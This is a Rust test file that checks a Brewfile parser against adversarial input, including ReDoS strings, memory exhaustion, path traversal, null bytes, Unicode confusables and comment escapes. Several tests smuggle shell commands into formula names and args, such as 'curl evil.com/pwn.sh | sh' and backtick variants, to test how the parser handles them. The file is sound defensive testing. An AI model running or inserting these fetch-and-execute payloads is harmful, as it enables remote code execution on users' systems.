//! Security tests for Brewfile parsing that attempt exploitation.

use crate::parser::BrewfileParser;

// ============================================================================
// REGEX DOS (ReDoS) ATTACKS
// ============================================================================

#[test]
fn attack_catastrophic_backtracking_brew() {
    // ATTACK: Crafted input to cause exponential regex backtracking
    let malicious = format!(
        "brew \"{}\"",
        "a".repeat(1000) + ", args: [" + &"\"x\",".repeat(1000) + "]"
    );

    // Test that parser completes in reasonable time
    let start = std::time::Instant::now();
    let result = BrewfileParser::parse(&malicious);
    let elapsed = start.elapsed();

    // Should complete in < 1 second
    assert!(
        elapsed.as_secs() < 1,
        "Regex DOS detected! Parsing took {} seconds",
        elapsed.as_secs()
    );

    // The parsing might succeed or fail, but shouldn't hang
    println!(
        "Parsing completed in {:?}, result: {:?}",
        elapsed,
        result.is_ok()
    );
}

#[test]
fn attack_deeply_nested_quotes() {
    // ATTACK: Deeply nested quotes to confuse string parsing
    let malicious = r#"brew "name""name""name""name""name""#;

    // Should either parse correctly or error, but not hang or crash
    let result = BrewfileParser::parse(malicious);

    // Document current behavior
    println!("Nested quotes result: {:?}", result);
}

#[test]
fn attack_huge_line_memory_dos() {
    // ATTACK: Extremely long single line to exhaust memory
    let _huge_line = "brew \"".to_string() + &"A".repeat(100_000_000) + "\"";

    // This could cause memory exhaustion
    // String allocation itself limits this, but still a DOS vector

    // TODO: Add line length limits in parser
}

// ============================================================================
// INJECTION ATTACKS
// ============================================================================

#[test]
fn attack_shell_metacharacters_in_formula_name() {
    // ATTACK: Shell metacharacters that might be executed if name is used unsafely
    let dangerous_names = vec![
        "formula; curl evil.com/pwn.sh | sh",
        "formula$(curl evil.com/pwn.sh)",
        "formula`curl evil.com/pwn.sh`",
        "formula\n curl evil.com/pwn.sh",
        "formula|curl evil.com/pwn.sh",
        "formula&& curl evil.com/pwn.sh",
    ];

    for name in dangerous_names {
        let brewfile_content = format!("brew \"{}\"", name);
        let result = BrewfileParser::parse(&brewfile_content);

        if let Ok(brewfile) = result {
            let entries = brewfile.brew_entries();
            if let Some(entry) = entries.first() {
                // Name is parsed as-is
                assert_eq!(entry.name, name);

                // The attack would only work if this name is later used in shell context
                // Zerobrew uses Command::args() not shell, so should be safe
                // But documents potential issue if name is used in error messages, logs, etc.
            }
        }
    }
}

#[test]
fn attack_path_traversal_in_formula_name() {
    // ATTACK: Formula name with path traversal
    let brewfile = r#"brew "../../../../../../etc/passwd""#;
    let parsed = BrewfileParser::parse(brewfile).unwrap();

    let entries = parsed.brew_entries();
    assert_eq!(entries.len(), 1);
    assert_eq!(entries[0].name, "../../../../../../etc/passwd");

    // This gets sent to API which won't find it
    // But demonstrates formula names aren't validated

    // TODO: Validate formula names are sane before API requests
}

#[test]
fn attack_null_bytes_in_strings() {
    // ATTACK: Null bytes to truncate strings
    let brewfile = "brew \"formula\0backdoor\"";
    let result = BrewfileParser::parse(brewfile);

    // Should handle null bytes safely (either parse or reject)
    println!("Null byte handling: {:?}", result);
}

#[test]
fn attack_unicode_confusables() {
    // ATTACK: Unicode characters that look like other characters
    let brewfile = r#"brew "јq""#; // Cyrillic 'ј' instead of Latin 'j'

    let parsed = BrewfileParser::parse(brewfile).unwrap();
    let entries = parsed.brew_entries();

    assert_eq!(entries[0].name, "јq"); // Different from "jq"

    // This could trick users into installing wrong package
    // API won't find it, but demonstrates no validation

    // TODO: Consider normalizing Unicode or warning on confusables
}

// ============================================================================
// COMMENT HANDLING EXPLOITS
// ============================================================================

#[test]
#[ignore = "Parser currently allows backslash continuation in comments - needs fix"]
fn attack_comment_escape_via_backslash() {
    // ATTACK: Try to escape from comment using backslash
    let brewfile = r#"
# This is a comment \
brew "malicious"
brew "jq"
"#;

    let parsed = BrewfileParser::parse(brewfile).unwrap();
    let entries = parsed.brew_entries();

    // In Ruby, backslash doesn't escape newline in comments
    // Parser should only find "jq", not "malicious"
    assert_eq!(
        entries.len(),
        1,
        "Comment escape was not handled correctly!"
    );
    assert_eq!(entries[0].name, "jq");
}

#[test]
fn attack_comment_injection_via_string() {
    // ATTACK: Inject comment character inside string to truncate
    let brewfile = r#"brew "formula#malicious", args: ["evil"]"#;

    let parsed = BrewfileParser::parse(brewfile).unwrap();
    let entries = parsed.brew_entries();

    // Should parse full formula name including the #
    assert_eq!(entries[0].name, "formula#malicious");
    assert_eq!(entries[0].args.len(), 1);
}

// ============================================================================
// ARRAY PARSING EXPLOITS
// ============================================================================

#[test]
fn attack_nested_arrays() {
    // ATTACK: Nested arrays to confuse parser
    let brewfile = r#"brew "formula", args: [["nested"]]"#;

    // Should either parse correctly or error, not crash
    let result = BrewfileParser::parse(brewfile);
    println!("Nested arrays result: {:?}", result);
}

#[test]
#[ignore = "Parser currently accepts unclosed arrays - needs validation"]
fn attack_unclosed_array() {
    // ATTACK: Unclosed array to cause parser confusion
    let brewfile = r#"brew "formula", args: ["arg1", "arg2"#;

    // Should error gracefully
    let result = BrewfileParser::parse(brewfile);
    assert!(result.is_err(), "Unclosed array should be rejected");
}

#[test]
fn attack_args_with_shell_injection() {
    // ATTACK: Arguments containing shell metacharacters
    let brewfile = r#"brew "git", args: ["--config=core.sshCommand='curl evil.com/pwn|sh'"]"#;

    let parsed = BrewfileParser::parse(brewfile).unwrap();
    let entries = parsed.brew_entries();

    // Args are parsed as-is
    assert_eq!(
        entries[0].args[0],
        "--config=core.sshCommand='curl evil.com/pwn|sh'"
    );

    // Since Zerobrew ignores args (bottles-only), this is harmless
    // But documents that args aren't sanitized
}

// ============================================================================
// MEMORY EXHAUSTION
// ============================================================================

#[test]
fn attack_million_entries() {
    // ATTACK: Brewfile with enormous number of entries
    let mut brewfile_content = String::new();

    for i in 0..10_000 {
        // 10k entries (1M would be too slow for tests)
        brewfile_content.push_str(&format!("brew \"package{}\"\n", i));
    }

    let start = std::time::Instant::now();
    let result = BrewfileParser::parse(&brewfile_content);
    let elapsed = start.elapsed();

    println!("Parsed 10k entries in {:?}", elapsed);

    assert!(result.is_ok(), "Parser should handle large files");
    assert_eq!(result.unwrap().entries.len(), 10_000);

    // TODO: Consider adding entry count limits or streaming parser for huge files
}

// ============================================================================
// SERVICE HINT EXPLOITATION
// ============================================================================

#[test]
fn attack_auto_enable_all_services() {
    // ATTACK: Brewfile that auto-enables many services
    let brewfile = r#"
brew "postgresql@15", restart_service: true
brew "redis", restart_service: true
brew "mysql", restart_service: true
brew "mongodb", restart_service: true
brew "nginx", restart_service: true
"#;

    let parsed = BrewfileParser::parse(brewfile).unwrap();
    let entries = parsed.brew_entries();

    // All have service hints
    assert_eq!(
        entries
            .iter()
            .filter(|e| e.restart_service.is_some())
            .count(),
        5
    );

    // With --with-services, this would auto-start 5 services
    // Could cause resource exhaustion or unexpected behavior

    // TODO: Consider:
    // - Confirmation prompt if > N services to enable
    // - List what will be enabled before starting
    // - Resource limits on simultaneous service starts
}
